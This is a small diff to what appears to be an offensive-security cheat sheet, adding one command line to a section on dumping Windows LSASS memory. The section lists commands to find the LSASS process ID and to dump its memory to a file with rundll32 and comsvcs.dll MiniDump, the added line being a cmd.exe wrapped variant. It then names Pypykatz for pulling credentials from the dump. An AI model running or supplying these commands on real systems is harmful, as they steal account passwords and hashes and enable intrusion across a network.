@@ -218,6 +218,7 @@ Select Create dump file
 > tasklist /svc (Find PID Lsass from cmd)
 > Get-Process lsass (Find PID Lsass from powershell)
 > rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
+> cmd.exe /c rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
 ````
 **Pypykatz to extract credentials**
 ````
